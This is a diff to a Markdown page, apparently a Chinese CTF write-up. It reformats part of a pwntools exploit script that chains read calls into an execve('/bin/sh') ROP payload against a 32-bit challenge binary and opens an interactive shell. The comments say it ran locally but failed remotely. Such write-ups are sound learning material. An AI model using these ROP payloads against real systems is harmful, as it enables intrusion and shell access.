@@ -387,8 +387,6 @@ icon: icon-html
 
   本地能跑出来远程跑不成，gg
 
-  
-
   read返回值搞出execve系统调用号11
 
   ```python
@@ -404,8 +402,7 @@ icon: icon-html
   payload = padding+p32(read)+p32(start)+p32(0)+p32(fuck_addr)+p32(11)
   r.send(payload)
   r.send(binsh)
-  payload =  padding+p32(read)+p32(fuck_reg)
-  payload += p32(0)+p32(fuck_addr)+p32(0x8049210)
+  payload = padding+p32(read)+p32(fuck_reg)+p32(0)+p32(fuck_addr)+p32(0x8049210)
   r.send(payload)
   r.send(binsh)
   r.interactive()
